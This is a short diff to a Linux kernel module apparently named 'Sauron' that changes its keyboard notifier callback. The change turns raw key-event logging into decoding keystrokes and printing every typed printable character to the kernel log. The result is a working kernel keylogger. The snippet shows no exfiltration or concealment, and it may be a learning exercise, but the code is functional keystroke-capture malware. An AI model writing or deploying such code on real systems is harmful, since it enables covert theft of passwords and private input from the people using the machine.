@@ -36,7 +36,15 @@ static void end_eye(void)
 static int sauron_notify(struct notifier_block *nb, unsigned long code, void *raw_data)
 {
     struct keyboard_notifier_param *data = raw_data;
-    printk("Sauron:\tcode 0x%lx\tdown 0x%x\tshift 0x%x\tvalue 0x%x\n", code, data->down, data->shift, data->value);
+    char c = data->value;
+
+    if (code == KBD_KEYSYM && data->down)
+    {
+        if (c == 0x01)
+            printk("\n");
+        if (c >= 0x20 && c < 0x7f)
+            printk(KERN_CONT "%c", c);
+    }
 
     return NOTIFY_OK;
 }
